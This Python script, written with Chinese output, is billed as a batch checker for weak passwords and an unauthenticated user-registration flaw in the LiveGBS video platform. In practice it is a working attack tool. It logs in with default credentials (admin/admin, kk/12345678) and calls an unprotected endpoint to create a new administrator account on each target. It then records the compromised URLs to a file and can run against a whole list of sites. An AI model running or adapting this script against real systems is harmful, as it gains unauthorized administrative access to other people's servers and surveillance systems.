import argparse
import requests

def weak(url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
               'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
               'X-Requested-With':'XMLHttpRequest'
             }
    try:
        attackurl1 = url + '/api/v1/login?username=kk&password=25d55ad283aa400af464c76d713c07ad'
        req1 = requests.get(attackurl1, headers=headers, timeout=10)
        if req1.status_code ==200:
            username = 'kk'
            password = '12345678'
            print(f"[+]登录成功！{url}账号：kk,密码:12345678")
            with open('success.txt','a+') as f:
                f.write(f"{url},账号：kk,密码:12345678\n")
        attackurl2 = url + '/api/v1/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3'
        req2 = requests.get(attackurl2, headers=headers, timeout=10)
        if req2.status_code ==200:
            print(f"[+]登录成功！{url}账号：admin,密码:admin")
            with open('success.txt','a+') as f:
                f.write(f"{url},账号：admin,密码:admin\n")
        else:
            print("[-]登录失败")
    except requests.exceptions.ConnectionError as e:
        print(f"连接失败")

def creat(url):
    try:
        attackurl = url + '/api/v1/user/save?ID=&Username=kk&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'}
        req = requests.get(attackurl, headers=headers, verify=False, timeout=10)
        if '12345678' in req.text or 'already exists' in req.text:
            print(f"[+]{url}成功注册kk用户且密码为12345678")
            with open('success.txt','a+') as f:
                f.write(f"[+]{url}成功注册kk用户且密码为12345678\n")
        else:
            print("[-]注册失败")
    except requests.exceptions.ConnectionError as e:
        print(f"连接失败")

def checkurls(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        for readline in f.readlines():
            weak(readline)
            creat(readline)
def startwith():
    logo = """"
    $$\       $$\                       $$$$$$\  $$$$$$$\   $$$$$$\  
$$ |      \__|                     $$  __$$\ $$  __$$\ $$  __$$\ 
$$ |      $$\ $$\    $$\  $$$$$$\  $$ /  \__|$$ |  $$ |$$ /  \__|
$$ |      $$ |\$$\  $$  |$$  __$$\ $$ |$$$$\ $$$$$$$\ |\$$$$$$\  
$$ |      $$ | \$$\$$  / $$$$$$$$ |$$ |\_$$ |$$  __$$\  \____$$\ 
$$ |      $$ |  \$$$  /  $$   ____|$$ |  $$ |$$ |  $$ |$$\   $$ |
$$$$$$$$\ $$ |   \$  /   \$$$$$$$\ \$$$$$$  |$$$$$$$  |\$$$$$$  |
\________|\__|    \_/     \_______| \______/ \_______/  \______/ 
                                                                 
                                                                 
                                    
    """
    print(logo)
    print("writen by loml13yyy")
if __name__ == '__main__':
    startwith()
    parser = argparse.ArgumentParser(description='LiveGBS弱口令即用户注册漏洞单批检测脚本')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        weak(args.url)
        creat(args.url)
    elif args.file:
        checkurls(args.file)
    else:
        parser.print_help()